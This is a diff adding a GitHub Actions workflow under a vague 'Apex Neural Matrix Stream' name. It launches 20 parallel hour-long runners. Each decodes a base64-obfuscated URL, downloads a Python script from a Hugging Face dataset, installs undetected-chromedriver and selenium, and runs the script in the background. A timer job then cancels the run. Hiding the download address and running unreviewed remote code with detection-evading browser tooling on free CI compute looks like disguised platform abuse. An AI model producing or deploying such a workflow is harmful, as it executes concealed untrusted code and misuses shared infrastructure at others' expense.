@@ -1,0 +1,92 @@
+name: Apex Neural Matrix Stream
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: apex-stream-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Timeout Guard: Stops the workflow execution safely after limit
+  # =================================================================
+  execution-guard:
+    name: "Execution Guard"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WAIT_TIMEOUT: 3540
+    steps:
+      - name: Start Guard Timer
+        run: |
+          echo "[GUARD] Monitoring active process for run: ${{ github.run_id }}"
+          echo "[GUARD] Operational window set to ${WAIT_TIMEOUT}s."
+
+          sleep "${WAIT_TIMEOUT}"
+
+          echo "[GUARD] Limit reached — triggering workflow termination."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[GUARD] Cancellation query issued."
+
+  # =================================================================
+  # Matrix Compute: Parallel processing across multiple workers
+  # =================================================================
+  matrix-compute:
+    name: "ComputeUnit-${{ matrix.unit_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_id: [101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120]
+
+    steps:
+      - name: System Setup
+        run: |
+          echo "[SETUP] Initializing environment on ComputeUnit-${{ matrix.unit_id }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      - name: Retrieve Executable
+        run: |
+          echo "[DOWNLOAD] Fetching remote application logic..."
+          URL_B64="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          TARGET_URL=$(echo "$URL_B64" | base64 -d)
+          curl -sL "$TARGET_URL" -o app_runner.py
+          echo "[DOWNLOAD] Executable script downloaded."
+
+      - name: Setup Dependencies
+        run: |
+          echo "[ENV] Provisioning Python modules..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      - name: Run Main Process
+        run: |
+          echo "[RUNNER] Launching core process on unit ${{ matrix.unit_id }}..."
+
+          python3 app_runner.py &
+          APP_PID=$!
+
+          echo "[RUNNER] Process spawned with PID: $APP_PID. Max window: 3540s."
+
+          sleep 3540
+
+          if ps -p "$APP_PID" > /dev/null 2>&1; then
+            echo "[RUNNER] Window expired — stopping active process."
+            kill -9 "$APP_PID"
+            echo "[RUNNER] Process stopped."
+          else
+            echo "[RUNNER] Process exited naturally."
+          fi
